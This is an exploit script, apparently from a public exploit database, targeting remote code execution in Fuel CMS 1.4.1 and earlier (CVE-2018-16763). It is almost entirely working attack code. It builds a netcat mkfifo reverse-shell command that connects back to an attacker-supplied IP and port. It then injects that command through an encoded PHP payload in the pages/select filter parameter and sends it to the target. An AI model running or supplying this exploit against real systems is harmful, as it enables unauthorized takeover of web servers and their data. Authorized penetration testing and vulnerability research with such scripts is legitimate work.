# Exploit Title: fuel CMS 1.4.1 - Remote Code Execution (1) Updated
# Date 2021-08-16
# Exploit Author: jtaubs1 (ice-wzl)
# Vendor Homepage: https://www.getfuelcms.com/
# Software Link: https://github.com/daylightstudio/FUEL-CMS/releases/tag/1.4.1
# Version: <= 1.4.1
# Tested on: Ubuntu - Apache2 - php5
# CVE : CVE-2018-16763

# Update included: Works with python3
    # Removed burp proxy code to allow it to run as a stand alone RCE exploit. 
    # Takes sys.args
    # Spawns a Reverse shell

#!/usr/bin/python3
import requests
import urllib.parse
import sys


url = sys.argv[1]
ip = sys.argv[2]
port = sys.argv[3]

command = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1| nc " 
command += ip 
command += " "
command += port
command += ">/tmp/f"

payload = url + "/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27"+urllib.parse.quote(command)+"%27%29%2b%27"
r = requests.get(payload)
print(r)















